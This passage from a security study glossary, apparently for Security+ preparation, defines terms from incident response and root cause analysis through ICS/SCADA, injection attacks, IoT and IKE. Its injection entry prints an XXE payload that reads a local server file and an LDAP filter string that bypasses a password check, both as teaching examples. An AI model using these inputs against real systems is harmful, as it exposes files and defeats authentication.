3. Ensure that affected parties are notified and provided with the means to remediate their own systems. For example, if customers' passwords are stolen, they should be advised to change the credentials for any other accounts where that password might have been used (not good practice, but most people do it).
Incident Response - Lessons Learned - The lessons learned process reviews severe security incidents to determine their root cause, whether they were avoidable, and how to avoid them in the future.

Lessons learned activity starts with a meeting where staff review the incident and responses. The meeting must include staff directly involved along with other noninvolved incident handlers, who can provide objective, external perspectives. All staff must contribute freely and openly to the discussion, so these meetings must avoid pointing blame and instead focus on improving procedures. Leadership should manage disciplinary concerns related to staff failing to follow established procedures separately.

Following the meeting, one or more analysts should compile a lessons learned report (LLR - An analysis of events that can provide insight into how to improve response and support processes in the future) or after-action report (AAR).

The lessons learned process should invoke root cause analysis (A technique used to determine the true cause of the problem that, when removed, prevents the problem from occurring again) or the effort to determine how the incident was able to occur. A lot of models have been developed to structure root cause analysis. One is the "Five Whys" model. This starts with a statement of the problem and then poses successive "Why" questions to drill down to root causes. Examples include the following:

1. Why was our patient safety database found on a dark website? Because a threat actor was able to copy it to USB and walk out of the building with it.

2. Why was a threat actor able to copy the database to USB at all or do so without generating an alert? Because they were able to disable the data loss prevention system.

3. Why were they able to disable the data loss prevention system? Because they were trusted with privileges to do so.

4. Why were they allocated these privileges? No one seems to know . . . all administrator accounts were issued with them.

5. Why didn't the act of disabling the data loss prevention system generate an alert? It was logged, but alerts for that category had been disabled for causing too many false positives.

This identifies two root causes as improper permission assignments and improper logging/alerting configuration. One issue with the "Five Whys" model is that it can quickly branch into different directions of inquiry.

Another approach is to ask different questions with a view to building a complete picture of the incident and its causes:

1. Who was the adversary? Was the incident insider driven, external, or a combination of both?

2. Why was the incident perpetrated? Discuss the motives of the adversary and the data assets they might have targeted.

3. When did the incident occur, when was it detected, and how long did it take to contain and eradicate?

4. Where did the incident occur (host systems and network segments affected)?

5. How did the incident occur? What tactics, techniques, and procedures (TTPs) were employed by the adversary? Were the TTPs known and documented in a knowledge base such as ATT&CK, or were they unique?

6. What security controls would have provided better mitigation or improved the response?

Another approach might be to step through the incident timeline to understand what was known, the reasoning for each decision, and what options or controls might have been more beneficial to the response.
Incident Response - Preparation - An incident response process that hardens systems, defines policies and procedures, establishes lines of communication, and puts resources in place.

The preparation process establishes and updates the policies and procedures for dealing with security breaches. This includes provisioning the personnel and resources to implement those policies.

Cybersecurity Infrastructure
Cybersecurity infrastructure is hardware and software tools that facilitate incident detection, digital forensics, and case management:

1. Incident detection tools provide visibility into the environment by fully or partially automating the collection and analysis of network traffic, system state monitoring, and log data.

2. Digital forensics tools facilitate acquiring and validating data from system memory and file systems. This can be performed just to assist incident response or to prosecute a threat actor.

3. Case management tools provide a database for logging incident details and coordinating response activities across a team of responders.

This functionality is often implemented as a single product suite. Tools such as security information and event management (SIEM) and security orchestration, automation and response (SOAR) provision alerting and monitoring dashboards to fully manage the steps in incident response.

Cyber Incident Response Team
Incident response requires team members with a range of security competencies. This team is variously described as a computer incident response team (CIRT), computer security incident response team (CSIRT), or computer emergency response team (CERT). Incident response might also involve or be wholly located within a security operations center (SOC). However it is set up, the team must be led by a senior executive decision-maker who can authorize actions following the most serious incidents. Managers ensure the day-to-day operation of the CIRT and coordinate response activity with other business departments. Analysts and technicians will work at various levels to prioritize cases and mitigate minor incidents on their own initiative.

As well as cybersecurity expertise, advice from other business divisions will also need to be called upon:

1. Legal - Evaluates incident response from the perspective of compliance with laws and industry regulations. It may also be necessary to liaise closely with law enforcement professionals which can be daunting without expert legal advice.

2. Human Resources (HR) - Deals with effects on employee contracts, employment law, and so on. HR can help address underlying organizational or personnel issues contributing to the incident, like employee dissatisfaction, workplace conflicts, or inadequate training.

3. Public Relations - Manages any negative press and/or social media reactions and comments from a serious incident.

Some organizations may prefer to outsource some of the CIRT functions to third-party agencies by retaining an incident response provider. External agents are able to deal more effectively with insider threats.

Communication Plan
Incident response policies should establish clear lines of communication for reporting incidents and notifying affected parties as the management of an incident progresses. It is vital to have essential contact information readily available.

It is critical to prevent the unintentional release of information beyond the team authorized to handle the incident. It is imperative that adversaries not be alerted to containment and remediation measures to be taken against them. Status and event details should be circulated on a need-to-know basis and only to trusted parties identified on a call list (A document listing authorized contacts for notification and collaboration during a security incident).

The team requires an out-of-band communication method that cannot be intercepted. Using corporate email runs the risk that the threat actor will be able to intercept communications.

Stakeholder Management
It is not helpful to publicize an incident in the press or through social media outside of planned communications. Ensure that parties with privileged information do not release this information to untrusted parties, whether intentionally or inadvertently.

Consider obligations to report an incident. It may be necessary to inform affected parties during or immediately after the incident so that they can perform their own remediation. There could also be a requirement to report to regulators or law enforcement.

Also, consider the marketing and PR impact of an incident. This can be highly damaging, and the company must demonstrate to customers that security systems have been improved.

Incident Response Plan
The outcome of preparation activity is a formal incident response plan (IRP - Specific procedures that must be performed if a certain type of event is detected or reported). This lists the procedures, contacts, and resources available to responders for various incident categories.
Incident Response - Testing - The procedures and tools used for incident response are difficult to master and execute effectively. Analysts should not be practicing them for the first time in the high-pressure environment of an actual incident. Running test exercises helps staff develop competencies and can help to identify deficiencies in the procedures and tools. Testing on specific incident response scenarios can use three forms:

1. Tabletop exercise - This is the least costly type of testing. The facilitator presents a scenario, and the responders explain what action they would take to identify, contain, and eradicate the threat. The training does not use computer systems. The scenario data is presented as flash cards.

2. Walkthroughs - In this model, a facilitator presents the scenario as for a tabletop exercise, but the incident responders demonstrate what actions they would take in response. Unlike a tabletop exercise, the responders perform actions such as running scans and analyzing sample files, typically on sandboxed versions of the company's actual response and recovery tools.

3. Simulations - A simulation is a team-based exercise, where the red team attempts an intrusion, the blue team operates response and recovery controls, and a white team moderates and evaluates the exercise. This type of training requires considerable investment and planning.
Incident Response - Training - The actions of staff immediately following the detection of an incident can have a critical impact on successful outcomes. Effective training on incident detection and reporting procedures equip staff with the knowledge they need to react swiftly and effectively to security events. Incident response is also likely to require coordinated efforts from several different departments or groups, so cross-departmental training is essential. The lessons learned phase of incident response often reveals a need for additional security awareness and compliance training for employees. This type of training helps employees develop the knowledge to identify attacks in the future.

Training should focus on more than just technical skills and knowledge. Security incidents can be very stressful and quickly cause working relationships to crack. Training can improve team building and communication skills, giving employees greater resilience when adverse events occur.
Incident Response Lifecycle - Procedures and guidelines covering appropriate priorities, actions, and responsibilities in the event of security incidents, divided into preparation, detection, analysis, containment, eradication/recovery, and lessons learned stages.

CompTIA's incident response lifecycle is a seven-step process:

1. Preparation - Makes the system resilient to attack in the first place. This includes hardening systems, writing policies and procedures, and setting up confidential lines of communication. It also implies creating incident response resources and procedures.

2. Detection - Discovers indicators of threat actor activity. Indicators that an incident may have occurred might be generated from an automated intrusion system. Alternatively, incidents might be manually detected through threat hunting operations or be reported by employees, customers, or law enforcement.

3. Analysis - Determines whether an incident has taken place and performs triage to assess how severe it might be from the data reported as indicators.

4. Containment - Limits the scope and magnitude of the incident. The principal aim of incident response is to secure data while limiting the immediate impact on customers and business partners. It is also necessary to notify stakeholders and identify other reporting requirements.

5. Eradication - Removes the cause and restores the affected system to a secure state by applying secure configuration settings and installing patches once the incident is contained.

6. Recovery - Reintegrates the system into the business process it supports with the cause of the incident eradicated. This recovery phase may involve the restoration of data from backup and security testing. Systems must be monitored closely for a period to detect and prevent any reoccurrence of the attack. The response process may have to iterate through multiple phases of identification, containment, eradication, and recovery to effect a complete resolution.

7. Lessons learned - Analyzes the incident and responses to identify whether procedures or systems could be improved. It is imperative to document the incident. Outputs from this phase route feedback to a new preparation phase in the cycle.
Incident response likely requires coordinated action and authorization from several different departments or managers, which adds further levels of complexity.

The IR process is focused on cybersecurity incidents. There are also major incidents that pose an existential threat to company-wide operations. These major incidents are handled by disaster recovery processes. A cybersecurity incident might lead to a major incident being declared, however.
Incident Response Plan (IRP) - Specific procedures that must be performed if a certain type of event is detected or reported.
Incident Response Policy - This policy outlines the processes to be followed after a security breach, or cyberattack occurs. It details the steps for identifying, investigating, controlling, and mitigating the impact of incidents, including procedures for communicating about the incident to internal and external sources.
Independent Assessments (Vendor Assessment Method) - Organizations often rely on independent assessments as crucial vendor selection criteria. Independent assessments involve engaging with independent experts to evaluate and verify vendor capabilities, security, and compliance practices. These assessments provide an objective and unbiased evaluation of vendor capabilities. By leveraging independent assessments, organizations can benefit from specialized knowledge and industry best practice approaches to security assessments that internal teams may not know. Leveraging independent assessments help mitigate potential biases, ensure thorough evaluations, and support informed decision-making during the vendor selection process. Additionally, periodic reassessment of existing vendors fosters continuous improvement in the vendor's security practices.
Indicator of Compromise (IoC) - A sign that an asset or network has been attacked or is currently under attack.

An indicator of compromise (IoC) is a residual sign that an asset or network has been successfully attacked or is continuing to be attacked. Put another way, an IoC is evidence of a TTP. In the scenario above, IoCs could include the presence of the compromised network monitor process version, connections to the Command and Control (C&C) network, disabled system recovery/backup features, registry entries and script remnants to execute the ransomware, files made inaccessible through encryption with different file extensions, and blackmail demand notices.

As there are many different targets and vectors of an attack, there are also thousands of potential IoCs. Many TTPs and IoCs are well known. They are documented and published by threat researchers. One of the best-known examples is the MITRE ATT&CK database. Modern scanning tools are usually integrated with threat feeds of published TTPs and indicators. This allows for automated scanning of malicious behaviors, rather than just signature-based malware detection.

An IoC can be definite and objectively identifiable, like a malware signature, but often IoCs can only be described with confidence via the correlation of many data points. Because these IoCs are often identified through patterns of anomalous activity rather than single events, they can be open to interpretation and therefore slow to diagnose. Consequently, threat intelligence platforms use artificial intelligence (AI) systems to perform automated analysis. These systems underpin the detection and response features of modern threat protection suites.

Strictly speaking, an IoC is evidence of an attack that was successful. The term "indicator of attack (IoA)" is sometimes also used for evidence of an intrusion attempt in progress.
Indoor Positioning System (IPS) - Technology that can derive a device's location when indoors by triangulating its proximity to radio sources such as Bluetooth beacons or Wi-Fi access points.
Industrial Camouflage - Methods of disguising the nature and purpose of buildings or parts of buildings.

Entry points to secure zones should be discreet. Do not allow an intruder the opportunity to inspect security mechanisms protecting such zones (or even to know where they are). Use industrial camouflage to make buildings and gateways protecting high-value assets unobtrusive or create high-visibility decoy areas to draw out potential threat actors.
Industrial Control System (ICS) - Network managing embedded devices (computer systems that are designed to perform a specific, dedicated function).

Industrial control systems (ICSs) provide mechanisms for workflow and process automation. These systems control machinery used in critical infrastructure, like power suppliers, water suppliers, health services, telecommunications, and national security services. An ICS that manages process automation within a single site is usually referred to as a distributed control system (DCS).

An ICS comprises plant devices and equipment with embedded programmable logic controllers (PLCs). The PLCs are linked either by an operational technology (OT) fieldbus serial network or by industrial Ethernet to actuators that operate valves, motors, circuit breakers, and other mechanical components, plus sensors that monitor some local state, such as temperature. Output and configuration of a PLC are performed by one or more human-machine interfaces (HMIs). An HMI might be a local control panel or software running on a computing host. PLCs are connected within a control loop, and the whole process automation system can be governed by a control server. Another important concept is the data historian or a database of all the information the control loop generated.

Supervisory Control and Data Acquisition (SCADA)
A supervisory control and data acquisition (SCADA) system takes the place of a control server in large-scale, multiple-site ICSs. SCADA typically run as software on ordinary computers, gathering data from and managing plant devices and equipment with embedded PLCs, referred to as field devices. SCADA typically use WAN communications, such as cellular or satellite, to link the SCADA server to field devices.

ICS/SCADA Applications
These types of systems are used within many sectors of industry:

1. Energy refers to power generation and distribution. More widely, utilities include water/sewage and transportation networks.

2. Industrial can refer specifically to mining and refining raw materials, involving hazardous high heat and pressure furnaces, presses, centrifuges, pumps, and so on.

3. Fabrication and manufacturing refer to creating components and assembling them into products. Embedded systems are used to control automated production systems, such as forges, mills, and assembly lines. These systems must work to extremely high precision.

4. Logistics refers to moving things from where they were made or assembled to where they need to be, either within a factory or for distribution to customers. Embedded technology is used in control of automated transport and lift systems plus sensors for component tracking.

5. Facilities refer to site and building management systems, typically operating automated heating, ventilation, and air conditioning (HVAC), lighting, and security systems.

ICS/SCADA was historically built without regard to IT security, though there is now high awareness of the necessity of enforcing security controls to protect them, especially when they operate in a networked environment.

One infamous example of an attack on an embedded system is the Stuxnet worm. This was designed to attack the SCADA management software running on Windows PCs to damage the centrifuges used by Iran's nuclear fuels program. NIST Special Publication 800-82 covers some recommendations for implementing security controls for ICS and SCADA.

Industrial systems have different priorities than IT systems. Often hazardous electromechanical components are involved, so safety is the overriding priority. Industrial processes also prioritize availability and integrity over confidentiality—reversing the CIA triad as the AIC triad.

Cybersecurity is paramount in Industrial Control Systems (ICS) and Supervisory Control and Data Acquisition (SCADA) systems. These systems are associated with critical infrastructure sectors such as energy, manufacturing, transportation, and water treatment. Cyberattacks on these systems can severely impact public safety, economic stability, and national security.

ICS and SCADA systems control and monitor critical processes and operational technologies, making them attractive targets for attackers. The consequences of attacks range from widespread power outages and environmental damage to economic losses and even loss of life. Malware, ransomware, unauthorized access, and targeted attacks pose significant risks to ICS and SCADA systems, and robust cybersecurity protections, including network segmentation, access controls, intrusion detection systems, encryption, and continuous monitoring, are essential to safeguarding these critical systems.
Information Security - Information security (infosec) refers to the protection of data resources from unauthorized access, attack, theft, or damage. Data may be vulnerable because of the way it is stored, transferred, or processed. The systems used to store, transmit, and process data must demonstrate the properties of security.
Information Security Policies - A document or series of documents that are backed by senior management and that detail requirements for protecting technology and information assets from threats and misuse.

These are policies created by an organization to ensure that all information technology users comply with rules and guidelines related to the security of the information stored within the environment or the organization's sphere of authority.
Information Sharing and Analysis Centers (ISACs) - A not-for-profit group set up to share sector-specific threat intelligence and security best practices among its members.
Information Systems Security Officer (ISSO) - Organizational role with technical responsibilities for implementation of security policies, frameworks, and controls.
Information-Sharing Organizations - Collaborative groups that exchange data about emerging cybersecurity threats and vulnerabilities.

Threat feed information-sharing organizations are collaborative groups that exchange data about emerging cybersecurity threats and vulnerabilities. These organizations collect, analyze, and disseminate threat intelligence from various sources, including their members, security researchers, and public sources. Members of these organizations, often composed of businesses, government entities, and academic institutions, can benefit from the shared intelligence by gaining insights into the latest threats they might not have access to individually. They can use this information to fortify their systems and respond swiftly to emerging threats.

Examples of such organizations include the Cyber Threat Alliance and the Information Sharing and Analysis Centers (ISAC - A not-for-profit group set up to share sector-specific threat intelligence and security best practices among its members) which span various industries. These organizations are crucial in enhancing collective cybersecurity resilience and promoting a collaborative approach to tackling cyber threats.
Infrastructure as a Service (IaaS) - A cloud service model that provisions virtual machines and network infrastructure.

Infrastructure as a service (IaaS) is a means of provisioning IT resources such as servers, load balancers, and storage area network (SAN) components quickly. Rather than purchase these components and the Internet links they require, you rent them as needed from the service provider's datacenter. Examples include Amazon Elastic Compute Cloud, Microsoft Azure Virtual Machines, Oracle Cloud, and OpenStack.
Infrastructure as Code (IaC) - Provisioning architecture in which deployment of resources is performed by scripted automation and orchestration.

Infrastructure as Code (IaC) is a software engineering practice that manages computing infrastructure using machine-readable definition files. These files contain code written in a specific format that can be read and executed by machines. These files manage and provision computing infrastructure. Machine-readable definition files are written in formats like YAML, JSON, and HCL (HashiCorp Configuration Language.) They contain information about the desired infrastructure state, including configuration settings, networking requirements, security policies, and other settings. By using machine-readable definition files, infrastructure can be deployed and managed automatically and consistently, reducing the risk of errors caused by manual intervention.

These files are typically version-controlled and can be treated like any other code in a software project. IaC allows developers and operations teams to automate the process of deploying and managing infrastructure, reducing the likelihood of errors and inconsistencies that can arise from manual configuration. By using IaC, teams can also easily replicate infrastructure across different environments, such as development, staging, and production, and ensure that their infrastructure configuration is consistent and reproducible.

HCL (HashiCorp Configuration Language) is a configuration language developed by HashiCorp and used in Infrastructure as Code (IaC) environments to manage and provision computing infrastructure. HCL is similar to JSON and YAML in terms of syntax, but it has some additional features that make it more suitable for infrastructure management. It supports variables inside configuration files and has a concise syntax that makes it easy to read and write. HCL is used in many popular HashiCorp tools, including Terraform and Consul.
Inherent Risk - Risk that an event will pose if no controls are put in place to mitigate it.

The result of a quantitative or qualitative analysis is a measure of inherent risk. Inherent risk is the level of risk before any type of mitigation has been attempted.

In theory, security controls or countermeasures could be introduced to address every risk factor. The difficulty is that security controls can be expensive, so it is important to balance the cost of the control with the cost associated with the risk. It is not possible to eliminate risk; rather the aim is to mitigate risk factors to the point where the organization is exposed only to a level of risk that it can tolerate. The overall status of risk management is referred to as risk posture. Risk posture shows which risk response options can be identified and prioritized. For example, an organization might identify the following priorities:

1. Regulatory requirements to deploy security controls and make demonstrable efforts to reduce risk. Examples of legislation and regulation that mandate risk controls include SOX, HIPAA, Gramm-Leach-Bliley, the Homeland Security Act, PCI DSS regulations, and various personal data protection measures.

2. High value asset, regardless of the likelihood of the threat(s).

3. Threats with high likelihood (that is, high ARO).

4. Procedures, equipment, or software that increase the likelihood of threats (for example, legacy applications, lack of user training, old software versions, unpatched software, running unnecessary services, not having auditing procedures in place, and so on).
Injection Attack - An attack that exploits weak request handling or input validation to run arbitrary code in a client browser or on a server.
Injection Attacks - An attack that exploits weak request handling or input validation to run arbitrary code in a client browser or on a server.

Attacks such as session replay, CSRF, and most types of XSS are client-side attacks. This means that they execute arbitrary code on the browser. A server-side (In a web application, input data that is executed or validated as part of a script or process running on the server) attack causes the server to do some processing or run a script or query in a way that is not authorized by the application design. Most server-side attacks depend on some kind of injection attack.

An injection attack exploits some unsecure way in which the application processes requests and queries. For example, an application might allow a user to view their profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a threat actor to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.

The persistent XSS and abuse of SQL queries and parameters discussed earlier in the course are both types of injection attack. There are a number of other injection attack types that pose serious threats to web applications and infrastructure.

Extensible Markup Language Injection
Extensible Markup Language (XML - A system for structuring documents so that they are human and machine readable. Information within the document is placed within tags, which describe how information within the document is structured) is used by apps for authentication and authorizations, and for other types of data exchange and uploading. Data submitted via XML with no encryption or input validation is vulnerable to spoofing, request forgery, and injection of arbitrary data or code. For example, an XML External Entity (XXE) attack embeds a request for a local resource:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/config"> ]>

<bar>&bar;</bar>

This defines an entity named bar that refers to a local file path. A successful attack will return the contents of /etc/config as part of the response.

Lightweight Directory Access Protocol (LDAP) Injection
The Lightweight Directory Access Protocol (LDAP) is another example of a query language. LDAP is specifically used to read and write network directory databases. A threat actor could exploit either unauthenticated access or a vulnerability in a client app to submit arbitrary LDAP queries. This could allow accounts to be created or deleted, or for the attacker to change authorizations and privileges.

LDAP filters are constructed from (name=value) attribute pairs delimited by parentheses and the logical operators AND (&) and OR (|). Adding filter parameters as unsanitized input can bypass access controls. For example, if a web form authenticates to an LDAP directory with the valid credentials Bob and Pa$$w0rd , it may construct a query such as this from the user input:

(&(username=Bob)(password=Pa$$w0rd))

Both parameters must be true for the login to be accepted. If the form input is not sanitized, a threat actor could bypass the password check by entering a valid username plus an LDAP filter string, such as bob)(&)) . This causes the password filter to be dropped for a condition that is always true:

(&(username=Bob)(&))
Inline Device - Placement and configuration of a network security control so that it becomes part of the cable path.

A device that is deployed inline becomes part of the cable path. No changes in the IP or routing topology are required. The device's interfaces are not configured with MAC or IP addresses. An inline device can copy network traffic to a monitor or sensor (a monitor that records or "sniffs" data from frames as they pass over network media, using methods such as a mirror port or TAP device). The sensor can be configured to receive traffic in two different ways:

1. Test access point (TAP) - This is an inline device with ports for incoming and outgoing network cabling and an inductor or optical splitter that physically copies the signal from the cabling to a monitor port. There are types for copper and fiber optic cabling. As a physical layer hardware solution, no logic decisions are made, so the monitor port receives every frame—corrupt or malformed or not—and the copying is unaffected by load.

2. SPAN (switched port analyzer) / mirror port - This means that the sensor is attached to a specially configured mirror port on a switch that receives copies of frames addressed to nominated access ports (or all the other ports). This method is not completely reliable. Frames with errors will not be mirrored, and frames may be dropped under heavy load.
Input Validation - Any technique used to ensure that the data entered into a field or variable in an application is handled appropriately by that application.

Input validation is an essential protection technique used in software and web development that addresses the issue of untrusted input. Untrusted input describes how an attacker can provide specially crafted data to an application to manipulate its behavior. Injection attacks exploit the input mechanisms applications rely on to execute malicious commands and scripts to access sensitive data, control the operation of the application, gain access to otherwise protected back-end systems, and disrupt operations.

Without effective input validation, applications are vulnerable to many different classes of injection attacks, such as SQL injection, code injection, cross-site scripting (XSS), and many others.

1. Allowlisting - This method only permits inputs that match a predetermined and approved set of values or patterns.

2. Blocklisting - This approach explicitly blocks known harmful inputs, such as certain special characters or patterns commonly used in attacks.

3. Data Type Checks - These checks ensure the input data is of the expected type, such as a string, integer, or date.

4. Range Checks - These validate that numeric inputs fall within expected ranges.

5. Regular Expressions - Also known as regex, these are used to match input to expected patterns or signs of malicious activity.

6. Encoding - This helps to safely and reliably prevent special characters in input from being interpreted as executable commands or scripts.
Insider Threat / Internal Threat Actor - A type of threat actor who is assigned privileges on the system that cause an intentional or unintentional incident. An internal threat (or insider threat) arises from an actor identified by the organization and granted some type of access. Within this group of internal threats, you can distinguish insiders with permanent privileges, such as employees, from insiders with temporary privileges, such as contractors and guests. There is the blurred case of former insiders, such as ex-employees now working at another company or who have been dismissed and now harbor a grievance. These can be classified as internal threats or treated as external threats with insider knowledge, and possibly some residual permissions, if effective offboarding controls are not in place. The main motivators for a malicious internal threat actor are revenge and financial gain. Like external threats, insider threats can be opportunistic or targeted. An employee who plans and executes a campaign to modify invoices and divert funds is launching a structured attack; an employee who tries to guess the password on the salary database a couple of times, having noticed that the file is available on the network, is perpetrating an opportunistic attack. You must also assess the possibility that an insider threat may be working in collaboration with an external threat actor or group. A whistleblower is someone with an ethical motivation for releasing confidential information. While this could be classed as an internal threat in some respects, it is important to realize that whistleblowers making protected disclosures, such as reporting financial fraud through an authorized channel, cannot themselves be threatened or labeled in any way that seems retaliatory or punitive.
Integrated Penetration Testing - A holistic approach that combines different types of penetration testing methodologies and techniques to evaluate an organization's security operations.

Integrated penetration testing refers to a holistic approach that combines different types of penetration testing methodologies and techniques to assess the overall security of an organization's systems, networks, applications, and physical infrastructure. Integrated penetration testing aims to provide a comprehensive and realistic evaluation of an organization's security operations. The importance of integrated penetration testing lies in its ability to accurately represent the organization's security posture and identify potential risks often overlooked when testing in isolated areas. For example, the combination of offensive and defensive penetration testing provides a comprehensive assessment of an organization's security posture. Offensive testing identifies vulnerabilities and weaknesses, while defensive testing evaluates the organization's ability to detect and respond to threats. By integrating both approaches, organizations can improve their security capabilities to better protect against different threats.
Integrity - The fundamental security goal of keeping organizational information accurate, free of errors, and without unauthorized modifications. Integrity means that the data is stored and transferred as intended, and any modification is unauthorized unless explicitly authorized through proper channels.
Integrity (Authentication) - It means that the authentication mechanism is reliable and not easy for threat actors to bypass or trick with counterfeit credentials.
Intelligence Fusion - Threat Hunting - In threat hunting, using sources of threat intelligence data to automate detection of adversary IoCs and TTPs.

Threat hunting can be performed by manual analysis of network and log data, but this is a very lengthy process. An organization with a security information and event management (SIEM) and threat analytics platform can apply intelligence fusion techniques. The analytics platform is kept up to date with a TTP and indicator threat data feed. Analysts can develop queries and filters to correlate threat data against on-premises data from network traffic and logs.
Intentional Threat - A threat actor with a malicious purpose.
Internal / External Compliance Reporting - Internal and external compliance reporting aim to assess and disclose an organization's compliance status, but they differ in scope, audience, and purpose. Internal compliance reporting primarily serves internal stakeholders (such as risk managers, executives, security analysts, and privacy officers), focuses on operational details, and supports internal decision-making. External compliance reporting targets external stakeholders (such as shareholders, customers, clients, regulators, vendors, and business partners), adheres to regulatory requirements, and provides high-level summaries of an organization's compliance performance. Both reporting forms promote accountability, transparency, and effective compliance management within organizations.
Internal Assessments (Governance & Compliance) - 1. Compliance Assessment - Internal compliance assessments ensure operating practices align with laws, regulations, standards, policies, and ethical requirements. These assessments evaluate the effectiveness of internal controls, identify noncompliance or risk areas, and communicate findings to stakeholders such as risk managers.

2. Audit Committee - Audit committees provide independent oversight and assurance regarding an organization's financial reporting, internal controls, and risk management practices. These committees are typically composed of board members independent of the organization's management team. Audit committees aim to enhance the integrity of financial statements, ensure compliance with legal and regulatory requirements, monitor the effectiveness of internal controls, oversee the external audit process, and promote transparency and accountability. Audit committees are critical in fostering confidence among shareholders, stakeholders, and the public by providing an independent and objective assessment of the organization's financial practices and contributing to sound corporate governance.

3. Self-Assessment - Self-assessments allow individuals or organizations to evaluate their performance, practices, and adherence to established criteria against predetermined metrics and measures. Self-assessments help identify strengths, weaknesses, and areas for improvement, enabling individuals or organizations to take proactive measures to enhance their effectiveness and outcomes. Self-assessments imply internal personnel with the expertise, knowledge, and understanding of the assessed area are available to complete them.

Internal assessments are required for government agencies according to the NIST RMF, PCI-DSS, and others.
Internet Header - A record of the email servers involved in transferring an email message from a sender to a recipient.
Internet Key Exchange (IKE) - Framework for creating a security association (SA) used with IPSec. An SA establishes that two hosts trust one another (authenticate) and agree on secure protocols and cipher suites to use to exchange data.

Each host or router that uses IPsec must be assigned a policy. An IPsec policy sets the authentication mechanism and also the use of AH/ESP and transport or tunnel mode for a connection between two peers.

IPsec's encryption and hashing functions depend on a shared secret. The secret must be communicated to both peers, and the peers must perform mutual authentication to confirm one another's identity. The Internet Key Exchange (IKE) protocol implements an authentication method, selects which cryptographic ciphers are mutually supported by both peers, and performs key exchange. The set of properties is referred to as a security association (SA).

IKE negotiations take place over two phases:

1. Phase I establishes the identity of the two peers and performs key agreement using the Diffie-Hellman algorithm to create a secure channel. Two methods of authenticating peers are commonly used:
i. Digital certificates - Are issued to each peer by a mutually trusted certificate authority to identify one another.
ii. Pre-shared key (group authentication) - Is when the same passphrase is configured on both peers.

2. Phase II uses the secure channel created in Phase I to establish which ciphers and key sizes will be used with AH and/or ESP in the IP sec session.

There are two versions of IKE. Version 1 was designed for site-to-site and host-to-host topologies and requires a supporting protocol to implement remote access VPNs. IKEv2 has some additional features that have made the protocol popular for use as a stand-alone remote access client-to-site VPN solution. The main changes are the following:

i. Supports EAP authentication methods, allowing, for example, user authentication against a RADIUS server.
ii. Provides a simple setup mode that reduces bandwidth without compromising security.
iii. Allows network address translation (NAT) traversal and MOBIKE multihoming. NAT traversal makes it easier to configure a tunnel allowed by a home router/firewall. Multihoming means that a smartphone client with Wi-Fi and cellular interfaces can keep the IPsec connection alive when switching between them.
Internet Message Access Protocol (IMAP) - Application protocol providing a means for a client to access and manage email messages stored in a mailbox on a remote server. IMAP4 utilizes TCP port number 143, while the secure version IMAPS uses TCP/993.
Internet of Things (IoT) - Devices that can report state and configuration data and be remotely managed over IP networks.

The Internet of Things (IoT) refers to the network of physical devices, vehicles, appliances, and other objects embedded with sensors, software, and connectivity, enabling them to collect and exchange data.

Sensors are small devices designed to detect changes in the physical environment, such as temperature, humidity, and motion. On the other hand, actuators can perform actions based on data collected by sensors, such as turning on a light or adjusting a thermostat. IoT devices communicate with each other and with other (often public cloud-based) systems over the Internet to exchange data and receive instructions. Cloud-based systems form an essential component of IoT infrastructures as they provide the computational power needed to perform data analytics on the large amounts of data generated by IoT devices.

IoT Examples
There are many IoT devices and applications in use today. For example, smart homes often use IoT sensors and actuators to control lighting, temperature, and security systems, allowing homeowners to monitor and adjust their homes remotely. Smart cities also use IoT to manage traffic, monitor air quality, and improve public safety. In the healthcare industry, IoT devices such as wearables and implantable devices can collect data on patient health and send it to healthcare providers for analysis. In agriculture, IoT sensors are used to monitor soil conditions, weather patterns, and crop growth, helping farmers make more informed decisions about planting and harvesting. IoT devices are used to improve efficiency, convenience, and quality of life in a wide range of industries and applications.

Factors Driving Adoption of IoT
Several factors drive the rapid adoption of IoT. The significantly decreased cost of IoT sensors and devices over the past few years has made them more affordable and accessible to businesses and consumers. This has enabled the development of a wide range of IoT applications and services that were previously too expensive to implement. Advances in connectivity technology, such as 5G and low-power wireless networks, have made connecting and managing large numbers of IoT devices easier and more efficient. This has also improved the speed and reliability of data transmission, enabling real-time monitoring and response. The proverbial explosion of data generated by IoT devices has led to new data analytics tools and techniques, such as machine learning and artificial intelligence, that help organizations analyze vast amounts of data and extract valuable insights.

The COVID-19 pandemic has accelerated the adoption of IoT in many industries, particularly in healthcare, where remote monitoring and telemedicine have become increasingly important. As more organizations recognize the value of IoT, adoption is likely to continue to grow in the coming years.

Security Risks Associated with IoT
There are several significant security risks associated with IoT. One major risk is the large number of IoT devices deployed without adequate security measures. Many IoT devices are designed with limited processing power and memory, making it difficult to implement strong security controls. This can make them vulnerable to cyberattacks, compromising data privacy, system integrity, and physical safety.

Another risk is the need for more standardization in IoT devices and protocols. Compatibility issues can make integrating different IoT devices and services difficult. It can also make implementing security controls more difficult, as different devices may have different security requirements and protocols, making them incompatible.

The sheer volume of data generated by IoT devices can make securing and protecting sensitive information difficult. As more devices are connected to the Internet, there is an increasing risk of data breaches and cyberattacks, which can result in the theft of personal and sensitive data.

Examples of security issues caused by implementing or using IoT include the Mirai botnet attack, which infected millions of IoT devices and used them to launch massive distributed denial of service (DDoS) attacks on websites and online services. In another case, a casino was hacked through a smart thermometer in a fish tank, which was used as a backdoor to access the casino's network. There have also been cases of IoT devices being hacked to spy on individuals, such as baby monitors and home security cameras.

IoT devices often have poor security characteristics for several reasons. IoT devices are typically designed to focus on functionality rather than security and have limited processing power and memory, making it difficult to implement strong security controls. Many IoT devices must be low cost, making it challenging for manufacturers to prioritize security features in their design and development process. Many IoT devices are rushed to market without proper security testing, resulting in vulnerabilities that cybercriminals can exploit.

Additionally, consumers and organizations need more awareness of the security risks associated with IoT devices. Many users and organizations do not realize that their devices are vulnerable to cyberattacks and may not take the necessary steps to protect themselves, such as changing default passwords or updating firmware.

Best Practice Guidance for IoT
The following provide guidance regarding the secure implementation of IoT:

The Internet of Things Security Foundation (IoTSF)
Industrial Internet Consortium (IIC) Security Framework
Cloud Security Alliance (CSA) IoT Security Controls Framework
European Telecommunications Standards Institute (ETSI) IoT Security Standards
Internet Protocol Security (IPsec) - Network protocol suite used to secure data through authentication and encryption as the data travels across the network or the Internet.

Transport Layer Security is applied at the application level. Internet Protocol Security (IPsec) operates at the network layer of the OSI model (layer 3). This means that it can be implemented without having to configure specific application support and that it incurs less packet overhead.

